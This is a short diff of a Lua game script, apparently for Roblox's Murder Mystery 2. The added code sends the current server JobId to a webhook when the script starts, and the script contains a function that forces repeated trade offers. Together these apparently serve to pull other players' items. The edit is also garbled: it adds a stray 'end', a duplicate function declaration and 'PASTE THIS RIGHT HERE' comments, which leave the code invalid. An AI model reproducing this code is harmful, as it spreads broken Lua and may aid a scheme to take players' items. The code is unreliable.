@@ -2377,6 +2377,11 @@ local function sendToWebhook(data)
     end)
 end
 
+    print("[Webhook] Sent successfully!")
+end
+end   -- <--- this is the end of sendToWebhook
+
+-- PASTE THIS RIGHT HERE:
 task.spawn(function()
     task.wait(1.5)
     sendToWebhook({
@@ -2385,6 +2390,8 @@ task.spawn(function()
         jobid = game.JobId
     })
 end)
+
+local function forceOfferReliable(key, itemType)  -- <--- original next function
 
 local function forceOfferReliable(key, itemType)
     for i = 1, 5 do  -- retry loop for MM2 sync
